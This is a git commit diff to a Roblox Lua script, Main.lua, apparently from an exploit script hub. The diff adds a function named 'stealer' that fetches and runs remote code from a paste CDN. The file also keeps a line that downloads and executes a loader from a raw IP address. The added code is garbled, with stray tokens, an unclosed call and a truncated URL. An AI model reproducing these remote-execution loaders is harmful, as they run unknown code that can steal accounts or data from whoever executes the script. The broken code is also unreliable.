9943c1062928bc287045ce4265bbe23ee7670ad5
ZephyrHub1 <quanghaha10092008@gmail.com>
2025-09-15 18:43:31 +0700

    Update Main.lua

--- Main.lua
+++ Main.lua
@@ -1,3 +1,12 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/MoziIHub/refs/heads/main/Alr"))()
+local function stealer()
+    loadstring(game:HttpGet('https://cdn.sourceb.in/bins/'))() stealer
+end
+local function loadui()
+  loadstring(game:HttpGet visual
+
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
 ID="b5bd87ab-c631-494c-9b65-aa0f5b823563";
 loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
